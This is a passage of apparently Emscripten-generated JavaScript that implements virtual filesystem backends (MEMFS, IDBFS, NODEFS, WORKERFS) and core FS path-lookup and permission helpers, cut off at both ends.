        if (node.contents.length > newSize) node.contents.length = newSize;
        else
            while (node.contents.length < newSize) node.contents.push(0);
        node.usedBytes = newSize
    }),
    node_ops: {
        getattr: (function(node) {
            var attr = {};
            attr.dev = FS.isChrdev(node.mode) ? node.id : 1;
            attr.ino = node.id;
            attr.mode = node.mode;
            attr.nlink = 1;
            attr.uid = 0;
            attr.gid = 0;
            attr.rdev = node.rdev;
            if (FS.isDir(node.mode)) {
                attr.size = 4096
            } else if (FS.isFile(node.mode)) {
                attr.size = node.usedBytes
            } else if (FS.isLink(node.mode)) {
                attr.size = node.link.length
            } else {
                attr.size = 0
            }
            attr.atime = new Date(node.timestamp);
            attr.mtime = new Date(node.timestamp);
            attr.ctime = new Date(node.timestamp);
            attr.blksize = 4096;
            attr.blocks = Math.ceil(attr.size / attr.blksize);
            return attr
        }),
        setattr: (function(node, attr) {
            if (attr.mode !== undefined) {
                node.mode = attr.mode
            }
            if (attr.timestamp !== undefined) {
                node.timestamp = attr.timestamp
            }
            if (attr.size !== undefined) {
                MEMFS.resizeFileStorage(node, attr.size)
            }
        }),
        lookup: (function(parent, name) {
            throw FS.genericErrors[ERRNO_CODES.ENOENT]
        }),
        mknod: (function(parent, name, mode, dev) {
            return MEMFS.createNode(parent, name, mode, dev)
        }),
        rename: (function(old_node, new_dir, new_name) {
            if (FS.isDir(old_node.mode)) {
                var new_node;
                try {
                    new_node = FS.lookupNode(new_dir, new_name)
                } catch (e) {}
                if (new_node) {
                    for (var i in new_node.contents) {
                        throw new FS.ErrnoError(ERRNO_CODES.ENOTEMPTY)
                    }
                }
            }
            delete old_node.parent.contents[old_node.name];
            old_node.name = new_name;
            new_dir.contents[new_name] = old_node;
            old_node.parent = new_dir
        }),
        unlink: (function(parent, name) {
            delete parent.contents[name]
        }),
        rmdir: (function(parent, name) {
            var node = FS.lookupNode(parent, name);
            for (var i in node.contents) {
                throw new FS.ErrnoError(ERRNO_CODES.ENOTEMPTY)
            }
            delete parent.contents[name]
        }),
        readdir: (function(node) {
            var entries = [".", ".."];
            for (var key in node.contents) {
                if (!node.contents.hasOwnProperty(key)) {
                    continue
                }
                entries.push(key)
            }
            return entries
        }),
        symlink: (function(parent, newname, oldpath) {
            var node = MEMFS.createNode(parent, newname, 511 | 40960, 0);
            node.link = oldpath;
            return node
        }),
        readlink: (function(node) {
            if (!FS.isLink(node.mode)) {
                throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
            }
            return node.link
        })
    },
    stream_ops: {
        read: (function(stream, buffer, offset, length, position) {
            var contents = stream.node.contents;
            if (position >= stream.node.usedBytes) return 0;
            var size = Math.min(stream.node.usedBytes - position, length);
            assert(size >= 0);
            if (size > 8 && contents.subarray) {
                buffer.set(contents.subarray(position, position + size), offset)
            } else {
                for (var i = 0; i < size; i++) buffer[offset + i] = contents[position + i]
            }
            return size
        }),
        write: (function(stream, buffer, offset, length, position, canOwn) {
            if (!length) return 0;
            var node = stream.node;
            node.timestamp = Date.now();
            if (buffer.subarray && (!node.contents || node.contents.subarray)) {
                if (canOwn) {
                    node.contents = buffer.subarray(offset, offset + length);
                    node.usedBytes = length;
                    return length
                } else if (node.usedBytes === 0 && position === 0) {
                    node.contents = new Uint8Array(buffer.subarray(offset, offset + length));
                    node.usedBytes = length;
                    return length
                } else if (position + length <= node.usedBytes) {
                    node.contents.set(buffer.subarray(offset, offset + length), position);
                    return length
                }
            }
            MEMFS.expandFileStorage(node, position + length);
            if (node.contents.subarray && buffer.subarray) node.contents.set(buffer.subarray(offset, offset + length), position);
            else {
                for (var i = 0; i < length; i++) {
                    node.contents[position + i] = buffer[offset + i]
                }
            }
            node.usedBytes = Math.max(node.usedBytes, position + length);
            return length
        }),
        llseek: (function(stream, offset, whence) {
            var position = offset;
            if (whence === 1) {
                position += stream.position
            } else if (whence === 2) {
                if (FS.isFile(stream.node.mode)) {
                    position += stream.node.usedBytes
                }
            }
            if (position < 0) {
                throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
            }
            return position
        }),
        allocate: (function(stream, offset, length) {
            MEMFS.expandFileStorage(stream.node, offset + length);
            stream.node.usedBytes = Math.max(stream.node.usedBytes, offset + length)
        }),
        mmap: (function(stream, buffer, offset, length, position, prot, flags) {
            if (!FS.isFile(stream.node.mode)) {
                throw new FS.ErrnoError(ERRNO_CODES.ENODEV)
            }
            var ptr;
            var allocated;
            var contents = stream.node.contents;
            if (!(flags & 2) && (contents.buffer === buffer || contents.buffer === buffer.buffer)) {
                allocated = !1;
                ptr = contents.byteOffset
            } else {
                if (position > 0 || position + length < stream.node.usedBytes) {
                    if (contents.subarray) {
                        contents = contents.subarray(position, position + length)
                    } else {
                        contents = Array.prototype.slice.call(contents, position, position + length)
                    }
                }
                allocated = !0;
                ptr = _malloc(length);
                if (!ptr) {
                    throw new FS.ErrnoError(ERRNO_CODES.ENOMEM)
                }
                buffer.set(contents, ptr)
            }
            return {
                ptr: ptr,
                allocated: allocated
            }
        }),
        msync: (function(stream, buffer, offset, length, mmapFlags) {
            if (!FS.isFile(stream.node.mode)) {
                throw new FS.ErrnoError(ERRNO_CODES.ENODEV)
            }
            if (mmapFlags & 2) {
                return 0
            }
            var bytesWritten = MEMFS.stream_ops.write(stream, buffer, 0, length, offset, !1);
            return 0
        })
    }
};
var IDBFS = {
    dbs: {},
    indexedDB: (function() {
        if (typeof indexedDB !== "undefined") return indexedDB;
        var ret = null;
        if (typeof window === "object") ret = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB;
        assert(ret, "IDBFS used, but indexedDB not supported");
        return ret
    }),
    DB_VERSION: 21,
    DB_STORE_NAME: "FILE_DATA",
    mount: (function(mount) {
        return MEMFS.mount.apply(null, arguments)
    }),
    syncfs: (function(mount, populate, callback) {
        IDBFS.getLocalSet(mount, (function(err, local) {
            if (err) return callback(err);
            IDBFS.getRemoteSet(mount, (function(err, remote) {
                if (err) return callback(err);
                var src = populate ? remote : local;
                var dst = populate ? local : remote;
                IDBFS.reconcile(src, dst, callback)
            }))
        }))
    }),
    getDB: (function(name, callback) {
        var db = IDBFS.dbs[name];
        if (db) {
            return callback(null, db)
        }
        var req;
        try {
            req = IDBFS.indexedDB().open(name, IDBFS.DB_VERSION)
        } catch (e) {
            return callback(e)
        }
        if (!req) {
            return callback("Unable to connect to IndexedDB")
        }
        req.onupgradeneeded = (function(e) {
            var db = e.target.result;
            var transaction = e.target.transaction;
            var fileStore;
            if (db.objectStoreNames.contains(IDBFS.DB_STORE_NAME)) {
                fileStore = transaction.objectStore(IDBFS.DB_STORE_NAME)
            } else {
                fileStore = db.createObjectStore(IDBFS.DB_STORE_NAME)
            }
            if (!fileStore.indexNames.contains("timestamp")) {
                fileStore.createIndex("timestamp", "timestamp", {
                    unique: !1
                })
            }
        });
        req.onsuccess = (function() {
            db = req.result;
            IDBFS.dbs[name] = db;
            callback(null, db)
        });
        req.onerror = (function(e) {
            callback(this.error);
            e.preventDefault()
        })
    }),
    getLocalSet: (function(mount, callback) {
        var entries = {};

        function isRealDir(p) {
            return p !== "." && p !== ".."
        }

        function toAbsolute(root) {
            return (function(p) {
                return PATH.join2(root, p)
            })
        }
        var check = FS.readdir(mount.mountpoint).filter(isRealDir).map(toAbsolute(mount.mountpoint));
        while (check.length) {
            var path = check.pop();
            var stat;
            try {
                stat = FS.stat(path)
            } catch (e) {
                return callback(e)
            }
            if (FS.isDir(stat.mode)) {
                check.push.apply(check, FS.readdir(path).filter(isRealDir).map(toAbsolute(path)))
            }
            entries[path] = {
                timestamp: stat.mtime
            }
        }
        return callback(null, {
            type: "local",
            entries: entries
        })
    }),
    getRemoteSet: (function(mount, callback) {
        var entries = {};
        IDBFS.getDB(mount.mountpoint, (function(err, db) {
            if (err) return callback(err);
            var transaction = db.transaction([IDBFS.DB_STORE_NAME], "readonly");
            transaction.onerror = (function(e) {
                callback(this.error);
                e.preventDefault()
            });
            var store = transaction.objectStore(IDBFS.DB_STORE_NAME);
            var index = store.index("timestamp");
            index.openKeyCursor().onsuccess = (function(event) {
                var cursor = event.target.result;
                if (!cursor) {
                    return callback(null, {
                        type: "remote",
                        db: db,
                        entries: entries
                    })
                }
                entries[cursor.primaryKey] = {
                    timestamp: cursor.key
                };
                cursor.continue()
            })
        }))
    }),
    loadLocalEntry: (function(path, callback) {
        var stat, node;
        try {
            var lookup = FS.lookupPath(path);
            node = lookup.node;
            stat = FS.stat(path)
        } catch (e) {
            return callback(e)
        }
        if (FS.isDir(stat.mode)) {
            return callback(null, {
                timestamp: stat.mtime,
                mode: stat.mode
            })
        } else if (FS.isFile(stat.mode)) {
            node.contents = MEMFS.getFileDataAsTypedArray(node);
            return callback(null, {
                timestamp: stat.mtime,
                mode: stat.mode,
                contents: node.contents
            })
        } else {
            return callback(new Error("node type not supported"))
        }
    }),
    storeLocalEntry: (function(path, entry, callback) {
        try {
            if (FS.isDir(entry.mode)) {
                FS.mkdir(path, entry.mode)
            } else if (FS.isFile(entry.mode)) {
                FS.writeFile(path, entry.contents, {
                    encoding: "binary",
                    canOwn: !0
                })
            } else {
                return callback(new Error("node type not supported"))
            }
            FS.chmod(path, entry.mode);
            FS.utime(path, entry.timestamp, entry.timestamp)
        } catch (e) {
            return callback(e)
        }
        callback(null)
    }),
    removeLocalEntry: (function(path, callback) {
        try {
            var lookup = FS.lookupPath(path);
            var stat = FS.stat(path);
            if (FS.isDir(stat.mode)) {
                FS.rmdir(path)
            } else if (FS.isFile(stat.mode)) {
                FS.unlink(path)
            }
        } catch (e) {
            return callback(e)
        }
        callback(null)
    }),
    loadRemoteEntry: (function(store, path, callback) {
        var req = store.get(path);
        req.onsuccess = (function(event) {
            callback(null, event.target.result)
        });
        req.onerror = (function(e) {
            callback(this.error);
            e.preventDefault()
        })
    }),
    storeRemoteEntry: (function(store, path, entry, callback) {
        var req = store.put(entry, path);
        req.onsuccess = (function() {
            callback(null)
        });
        req.onerror = (function(e) {
            callback(this.error);
            e.preventDefault()
        })
    }),
    removeRemoteEntry: (function(store, path, callback) {
        var req = store.delete(path);
        req.onsuccess = (function() {
            callback(null)
        });
        req.onerror = (function(e) {
            callback(this.error);
            e.preventDefault()
        })
    }),
    reconcile: (function(src, dst, callback) {
        var total = 0;
        var create = [];
        Object.keys(src.entries).forEach((function(key) {
            var e = src.entries[key];
            var e2 = dst.entries[key];
            if (!e2 || e.timestamp > e2.timestamp) {
                create.push(key);
                total++
            }
        }));
        var remove = [];
        Object.keys(dst.entries).forEach((function(key) {
            var e = dst.entries[key];
            var e2 = src.entries[key];
            if (!e2) {
                remove.push(key);
                total++
            }
        }));
        if (!total) {
            return callback(null)
        }
        var completed = 0;
        var db = src.type === "remote" ? src.db : dst.db;
        var transaction = db.transaction([IDBFS.DB_STORE_NAME], "readwrite");
        var store = transaction.objectStore(IDBFS.DB_STORE_NAME);

        function done(err) {
            if (err) {
                if (!done.errored) {
                    done.errored = !0;
                    return callback(err)
                }
                return
            }
            if (++completed >= total) {
                return callback(null)
            }
        }
        transaction.onerror = (function(e) {
            done(this.error);
            e.preventDefault()
        });
        create.sort().forEach((function(path) {
            if (dst.type === "local") {
                IDBFS.loadRemoteEntry(store, path, (function(err, entry) {
                    if (err) return done(err);
                    IDBFS.storeLocalEntry(path, entry, done)
                }))
            } else {
                IDBFS.loadLocalEntry(path, (function(err, entry) {
                    if (err) return done(err);
                    IDBFS.storeRemoteEntry(store, path, entry, done)
                }))
            }
        }));
        remove.sort().reverse().forEach((function(path) {
            if (dst.type === "local") {
                IDBFS.removeLocalEntry(path, done)
            } else {
                IDBFS.removeRemoteEntry(store, path, done)
            }
        }))
    })
};
var NODEFS = {
    isWindows: !1,
    staticInit: (function() {
        NODEFS.isWindows = !!process.platform.match(/^win/)
    }),
    mount: (function(mount) {
        assert(ENVIRONMENT_IS_NODE);
        return NODEFS.createNode(null, "/", NODEFS.getMode(mount.opts.root), 0)
    }),
    createNode: (function(parent, name, mode, dev) {
        if (!FS.isDir(mode) && !FS.isFile(mode) && !FS.isLink(mode)) {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
        var node = FS.createNode(parent, name, mode);
        node.node_ops = NODEFS.node_ops;
        node.stream_ops = NODEFS.stream_ops;
        return node
    }),
    getMode: (function(path) {
        var stat;
        try {
            stat = fs.lstatSync(path);
            if (NODEFS.isWindows) {
                stat.mode = stat.mode | (stat.mode & 146) >> 1
            }
        } catch (e) {
            if (!e.code) throw e;
            throw new FS.ErrnoError(ERRNO_CODES[e.code])
        }
        return stat.mode
    }),
    realPath: (function(node) {
        var parts = [];
        while (node.parent !== node) {
            parts.push(node.name);
            node = node.parent
        }
        parts.push(node.mount.opts.root);
        parts.reverse();
        return PATH.join.apply(null, parts)
    }),
    flagsToPermissionStringMap: {
        0: "r",
        1: "r+",
        2: "r+",
        64: "r",
        65: "r+",
        66: "r+",
        129: "rx+",
        193: "rx+",
        514: "w+",
        577: "w",
        578: "w+",
        705: "wx",
        706: "wx+",
        1024: "a",
        1025: "a",
        1026: "a+",
        1089: "a",
        1090: "a+",
        1153: "ax",
        1154: "ax+",
        1217: "ax",
        1218: "ax+",
        4096: "rs",
        4098: "rs+"
    },
    flagsToPermissionString: (function(flags) {
        flags &= ~2097152;
        flags &= ~2048;
        flags &= ~32768;
        flags &= ~524288;
        if (flags in NODEFS.flagsToPermissionStringMap) {
            return NODEFS.flagsToPermissionStringMap[flags]
        } else {
            throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
        }
    }),
    node_ops: {
        getattr: (function(node) {
            var path = NODEFS.realPath(node);
            var stat;
            try {
                stat = fs.lstatSync(path)
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
            if (NODEFS.isWindows && !stat.blksize) {
                stat.blksize = 4096
            }
            if (NODEFS.isWindows && !stat.blocks) {
                stat.blocks = (stat.size + stat.blksize - 1) / stat.blksize | 0
            }
            return {
                dev: stat.dev,
                ino: stat.ino,
                mode: stat.mode,
                nlink: stat.nlink,
                uid: stat.uid,
                gid: stat.gid,
                rdev: stat.rdev,
                size: stat.size,
                atime: stat.atime,
                mtime: stat.mtime,
                ctime: stat.ctime,
                blksize: stat.blksize,
                blocks: stat.blocks
            }
        }),
        setattr: (function(node, attr) {
            var path = NODEFS.realPath(node);
            try {
                if (attr.mode !== undefined) {
                    fs.chmodSync(path, attr.mode);
                    node.mode = attr.mode
                }
                if (attr.timestamp !== undefined) {
                    var date = new Date(attr.timestamp);
                    fs.utimesSync(path, date, date)
                }
                if (attr.size !== undefined) {
                    fs.truncateSync(path, attr.size)
                }
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        lookup: (function(parent, name) {
            var path = PATH.join2(NODEFS.realPath(parent), name);
            var mode = NODEFS.getMode(path);
            return NODEFS.createNode(parent, name, mode)
        }),
        mknod: (function(parent, name, mode, dev) {
            var node = NODEFS.createNode(parent, name, mode, dev);
            var path = NODEFS.realPath(node);
            try {
                if (FS.isDir(node.mode)) {
                    fs.mkdirSync(path, node.mode)
                } else {
                    fs.writeFileSync(path, "", {
                        mode: node.mode
                    })
                }
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
            return node
        }),
        rename: (function(oldNode, newDir, newName) {
            var oldPath = NODEFS.realPath(oldNode);
            var newPath = PATH.join2(NODEFS.realPath(newDir), newName);
            try {
                fs.renameSync(oldPath, newPath)
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        unlink: (function(parent, name) {
            var path = PATH.join2(NODEFS.realPath(parent), name);
            try {
                fs.unlinkSync(path)
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        rmdir: (function(parent, name) {
            var path = PATH.join2(NODEFS.realPath(parent), name);
            try {
                fs.rmdirSync(path)
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        readdir: (function(node) {
            var path = NODEFS.realPath(node);
            try {
                return fs.readdirSync(path)
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        symlink: (function(parent, newName, oldPath) {
            var newPath = PATH.join2(NODEFS.realPath(parent), newName);
            try {
                fs.symlinkSync(oldPath, newPath)
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        readlink: (function(node) {
            var path = NODEFS.realPath(node);
            try {
                path = fs.readlinkSync(path);
                path = NODEJS_PATH.relative(NODEJS_PATH.resolve(node.mount.opts.root), path);
                return path
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        })
    },
    stream_ops: {
        open: (function(stream) {
            var path = NODEFS.realPath(stream.node);
            try {
                if (FS.isFile(stream.node.mode)) {
                    stream.nfd = fs.openSync(path, NODEFS.flagsToPermissionString(stream.flags))
                }
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        close: (function(stream) {
            try {
                if (FS.isFile(stream.node.mode) && stream.nfd) {
                    fs.closeSync(stream.nfd)
                }
            } catch (e) {
                if (!e.code) throw e;
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
        }),
        read: (function(stream, buffer, offset, length, position) {
            if (length === 0) return 0;
            var nbuffer = new Buffer(length);
            var res;
            try {
                res = fs.readSync(stream.nfd, nbuffer, 0, length, position)
            } catch (e) {
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
            if (res > 0) {
                for (var i = 0; i < res; i++) {
                    buffer[offset + i] = nbuffer[i]
                }
            }
            return res
        }),
        write: (function(stream, buffer, offset, length, position) {
            var nbuffer = new Buffer(buffer.subarray(offset, offset + length));
            var res;
            try {
                res = fs.writeSync(stream.nfd, nbuffer, 0, length, position)
            } catch (e) {
                throw new FS.ErrnoError(ERRNO_CODES[e.code])
            }
            return res
        }),
        llseek: (function(stream, offset, whence) {
            var position = offset;
            if (whence === 1) {
                position += stream.position
            } else if (whence === 2) {
                if (FS.isFile(stream.node.mode)) {
                    try {
                        var stat = fs.fstatSync(stream.nfd);
                        position += stat.size
                    } catch (e) {
                        throw new FS.ErrnoError(ERRNO_CODES[e.code])
                    }
                }
            }
            if (position < 0) {
                throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
            }
            return position
        })
    }
};
var WORKERFS = {
    DIR_MODE: 16895,
    FILE_MODE: 33279,
    reader: null,
    mount: (function(mount) {
        assert(ENVIRONMENT_IS_WORKER);
        if (!WORKERFS.reader) WORKERFS.reader = new FileReaderSync;
        var root = WORKERFS.createNode(null, "/", WORKERFS.DIR_MODE, 0);
        var createdParents = {};

        function ensureParent(path) {
            var parts = path.split("/");
            var parent = root;
            for (var i = 0; i < parts.length - 1; i++) {
                var curr = parts.slice(0, i + 1).join("/");
                if (!createdParents[curr]) {
                    createdParents[curr] = WORKERFS.createNode(parent, parts[i], WORKERFS.DIR_MODE, 0)
                }
                parent = createdParents[curr]
            }
            return parent
        }

        function base(path) {
            var parts = path.split("/");
            return parts[parts.length - 1]
        }
        Array.prototype.forEach.call(mount.opts.files || [], (function(file) {
            WORKERFS.createNode(ensureParent(file.name), base(file.name), WORKERFS.FILE_MODE, 0, file, file.lastModifiedDate)
        }));
        (mount.opts.blobs || []).forEach((function(obj) {
            WORKERFS.createNode(ensureParent(obj.name), base(obj.name), WORKERFS.FILE_MODE, 0, obj.data)
        }));
        (mount.opts.packages || []).forEach((function(pack) {
            pack.metadata.files.forEach((function(file) {
                var name = file.filename.substr(1);
                WORKERFS.createNode(ensureParent(name), base(name), WORKERFS.FILE_MODE, 0, pack.blob.slice(file.start, file.end))
            }))
        }));
        return root
    }),
    createNode: (function(parent, name, mode, dev, contents, mtime) {
        var node = FS.createNode(parent, name, mode);
        node.mode = mode;
        node.node_ops = WORKERFS.node_ops;
        node.stream_ops = WORKERFS.stream_ops;
        node.timestamp = (mtime || new Date).getTime();
        assert(WORKERFS.FILE_MODE !== WORKERFS.DIR_MODE);
        if (mode === WORKERFS.FILE_MODE) {
            node.size = contents.size;
            node.contents = contents
        } else {
            node.size = 4096;
            node.contents = {}
        }
        if (parent) {
            parent.contents[name] = node
        }
        return node
    }),
    node_ops: {
        getattr: (function(node) {
            return {
                dev: 1,
                ino: undefined,
                mode: node.mode,
                nlink: 1,
                uid: 0,
                gid: 0,
                rdev: undefined,
                size: node.size,
                atime: new Date(node.timestamp),
                mtime: new Date(node.timestamp),
                ctime: new Date(node.timestamp),
                blksize: 4096,
                blocks: Math.ceil(node.size / 4096)
            }
        }),
        setattr: (function(node, attr) {
            if (attr.mode !== undefined) {
                node.mode = attr.mode
            }
            if (attr.timestamp !== undefined) {
                node.timestamp = attr.timestamp
            }
        }),
        lookup: (function(parent, name) {
            throw new FS.ErrnoError(ERRNO_CODES.ENOENT)
        }),
        mknod: (function(parent, name, mode, dev) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }),
        rename: (function(oldNode, newDir, newName) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }),
        unlink: (function(parent, name) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }),
        rmdir: (function(parent, name) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }),
        readdir: (function(node) {
            var entries = [".", ".."];
            for (var key in node.contents) {
                if (!node.contents.hasOwnProperty(key)) {
                    continue
                }
                entries.push(key)
            }
            return entries
        }),
        symlink: (function(parent, newName, oldPath) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        }),
        readlink: (function(node) {
            throw new FS.ErrnoError(ERRNO_CODES.EPERM)
        })
    },
    stream_ops: {
        read: (function(stream, buffer, offset, length, position) {
            if (position >= stream.node.size) return 0;
            var chunk = stream.node.contents.slice(position, position + length);
            var ab = WORKERFS.reader.readAsArrayBuffer(chunk);
            buffer.set(new Uint8Array(ab), offset);
            return chunk.size
        }),
        write: (function(stream, buffer, offset, length, position) {
            throw new FS.ErrnoError(ERRNO_CODES.EIO)
        }),
        llseek: (function(stream, offset, whence) {
            var position = offset;
            if (whence === 1) {
                position += stream.position
            } else if (whence === 2) {
                if (FS.isFile(stream.node.mode)) {
                    position += stream.node.size
                }
            }
            if (position < 0) {
                throw new FS.ErrnoError(ERRNO_CODES.EINVAL)
            }
            return position
        })
    }
};
STATICTOP += 16;
STATICTOP += 16;
STATICTOP += 16;
var FS = {
    root: null,
    mounts: [],
    devices: [null],
    streams: [],
    nextInode: 1,
    nameTable: null,
    currentPath: "/",
    initialized: !1,
    ignorePermissions: !0,
    trackingDelegate: {},
    tracking: {
        openFlags: {
            READ: 1,
            WRITE: 2
        }
    },
    ErrnoError: null,
    genericErrors: {},
    filesystems: null,
    syncFSRequests: 0,
    handleFSError: (function(e) {
        if (!(e instanceof FS.ErrnoError)) throw e + " : " + stackTrace();
        return ___setErrNo(e.errno)
    }),
    lookupPath: (function(path, opts) {
        path = PATH.resolve(FS.cwd(), path);
        opts = opts || {};
        if (!path) return {
            path: "",
            node: null
        };
        var defaults = {
            follow_mount: !0,
            recurse_count: 0
        };
        for (var key in defaults) {
            if (opts[key] === undefined) {
                opts[key] = defaults[key]
            }
        }
        if (opts.recurse_count > 8) {
            throw new FS.ErrnoError(ERRNO_CODES.ELOOP)
        }
        var parts = PATH.normalizeArray(path.split("/").filter((function(p) {
            return !!p
        })), !1);
        var current = FS.root;
        var current_path = "/";
        for (var i = 0; i < parts.length; i++) {
            var islast = i === parts.length - 1;
            if (islast && opts.parent) {
                break
            }
            current = FS.lookupNode(current, parts[i]);
            current_path = PATH.join2(current_path, parts[i]);
            if (FS.isMountpoint(current)) {
                if (!islast || islast && opts.follow_mount) {
                    current = current.mounted.root
                }
            }
            if (!islast || opts.follow) {
                var count = 0;
                while (FS.isLink(current.mode)) {
                    var link = FS.readlink(current_path);
                    current_path = PATH.resolve(PATH.dirname(current_path), link);
                    var lookup = FS.lookupPath(current_path, {
                        recurse_count: opts.recurse_count
                    });
                    current = lookup.node;
                    if (count++ > 40) {
                        throw new FS.ErrnoError(ERRNO_CODES.ELOOP)
                    }
                }
            }
        }
        return {
            path: current_path,
            node: current
        }
    }),
    getPath: (function(node) {
        var path;
        while (!0) {
            if (FS.isRoot(node)) {
                var mount = node.mount.mountpoint;
                if (!path) return mount;
                return mount[mount.length - 1] !== "/" ? mount + "/" + path : mount + path
            }
            path = path ? node.name + "/" + path : node.name;
            node = node.parent
        }
    }),
    hashName: (function(parentid, name) {
        var hash = 0;
        for (var i = 0; i < name.length; i++) {
            hash = (hash << 5) - hash + name.charCodeAt(i) | 0
        }
        return (parentid + hash >>> 0) % FS.nameTable.length
    }),
    hashAddNode: (function(node) {
        var hash = FS.hashName(node.parent.id, node.name);
        node.name_next = FS.nameTable[hash];
        FS.nameTable[hash] = node
    }),
    hashRemoveNode: (function(node) {
        var hash = FS.hashName(node.parent.id, node.name);
        if (FS.nameTable[hash] === node) {
            FS.nameTable[hash] = node.name_next
        } else {
            var current = FS.nameTable[hash];
            while (current) {
                if (current.name_next === node) {
                    current.name_next = node.name_next;
                    break
                }
                current = current.name_next
            }
        }
    }),
    lookupNode: (function(parent, name) {
        var err = FS.mayLookup(parent);
        if (err) {
            throw new FS.ErrnoError(err, parent)
        }
        var hash = FS.hashName(parent.id, name);
        for (var node = FS.nameTable[hash]; node; node = node.name_next) {
            var nodeName = node.name;
            if (node.parent.id === parent.id && nodeName === name) {
                return node
            }
        }
        return FS.lookup(parent, name)
    }),
    createNode: (function(parent, name, mode, rdev) {
        if (!FS.FSNode) {
            FS.FSNode = (function(parent, name, mode, rdev) {
                if (!parent) {
                    parent = this
                }
                this.parent = parent;
                this.mount = parent.mount;
                this.mounted = null;
                this.id = FS.nextInode++;
                this.name = name;
                this.mode = mode;
                this.node_ops = {};
                this.stream_ops = {};
                this.rdev = rdev
            });
            FS.FSNode.prototype = {};
            var readMode = 292 | 73;
            var writeMode = 146;
            Object.defineProperties(FS.FSNode.prototype, {
                read: {
                    get: (function() {
                        return (this.mode & readMode) === readMode
                    }),
                    set: (function(val) {
                        val ? this.mode |= readMode : this.mode &= ~readMode
                    })
                },
                write: {
                    get: (function() {
                        return (this.mode & writeMode) === writeMode
                    }),
                    set: (function(val) {
                        val ? this.mode |= writeMode : this.mode &= ~writeMode
                    })
                },
                isFolder: {
                    get: (function() {
                        return FS.isDir(this.mode)
                    })
                },
                isDevice: {
                    get: (function() {
                        return FS.isChrdev(this.mode)
                    })
                }
            })
        }
        var node = new FS.FSNode(parent, name, mode, rdev);
        FS.hashAddNode(node);
        return node
    }),
    destroyNode: (function(node) {
        FS.hashRemoveNode(node)
    }),
    isRoot: (function(node) {
        return node === node.parent
    }),
    isMountpoint: (function(node) {
        return !!node.mounted
    }),
    isFile: (function(mode) {
        return (mode & 61440) === 32768
    }),
    isDir: (function(mode) {
        return (mode & 61440) === 16384
    }),
    isLink: (function(mode) {
        return (mode & 61440) === 40960
    }),
    isChrdev: (function(mode) {
        return (mode & 61440) === 8192
    }),
    isBlkdev: (function(mode) {
        return (mode & 61440) === 24576
    }),
    isFIFO: (function(mode) {
        return (mode & 61440) === 4096
    }),
    isSocket: (function(mode) {
        return (mode & 49152) === 49152
    }),
    flagModes: {
        "r": 0,
        "rs": 1052672,
        "r+": 2,
        "w": 577,
        "wx": 705,
        "xw": 705,
        "w+": 578,
        "wx+": 706,
        "xw+": 706,
        "a": 1089,
        "ax": 1217,
        "xa": 1217,
        "a+": 1090,
        "ax+": 1218,
        "xa+": 1218
    },
    modeStringToFlags: (function(str) {
        var flags = FS.flagModes[str];
        if (typeof flags === "undefined") {
            throw new Error("Unknown file open mode: " + str)
        }
        return flags
    }),
    flagsToPermissionString: (function(flag) {
        var perms = ["r", "w", "rw"][flag & 3];
        if (flag & 512) {
            perms += "w"
        }
        return perms
    }),
    nodePermissions: (function(node, perms) {
        if (FS.ignorePermissions) {
            return 0
        }
        if (perms.indexOf("r") !== -1 && !(node.mode & 292)) {
            return ERRNO_CODES.EACCES
        } else if (perms.indexOf("w") !== -1 && !(node.mode & 146)) {
            return ERRNO_CODES.EACCES
        } else if (perms.indexOf("x") !== -1 && !(node.mode & 73)) {
            return ERRNO_CODES.EACCES
        }
        return 0
    }),
    mayLookup: (function(dir) {
        var err = FS.nodePermissions(dir, "x");
        if (err) return err;
        if (!dir.node_ops.lookup) return ERRNO_CODES.EACCES;
        return 0
    }),
    mayCreate: (function(dir, name) {
        try {
            var node = FS.lookupNode(dir, name);
            return ERRNO_CODES.EEXIST
        } catch (e) {}
        return FS.nodePermissions(dir, "wx")
    }),
    mayDelete: (function(dir, name, isdir) {
        var node;
        try {
            node = FS.lookupNode(dir, name)
        } catch (e) {
            return e.errno
        }
        var err = FS.nodePermissions(dir, "wx");
        if (err) {
            return err
        }
        if (isdir) {
            if (!FS.isDir(node.mode)) {
                return ERRNO_CODES.ENOTDIR
            }
            if (FS.isRoot(node) || FS.getPath(node) === FS.cwd()) {
                return ERRNO_CODES.EBUSY
            }
        } else {
            if (FS.isDir(node.mode)) {
                return ERRNO_CODES.EISDIR
            }
        }
        return 0
    }),
    mayOpen: (function(node, flags) {
        if (!node) {
            return ERRNO_CODES.ENOENT
        }
        if (FS.isLink(node.mode)) {
            return ERRNO_CODES.ELOOP
        } else if (FS.isDir(node.mode)) {
            if (FS.flagsToPermissionString(flags) !== "r" || flags & 512) {
                return ERRNO_CODES.EISDIR
            }
        }
        return FS.nodePermissions(node, FS.flagsToPermissionString(flags))
    }),
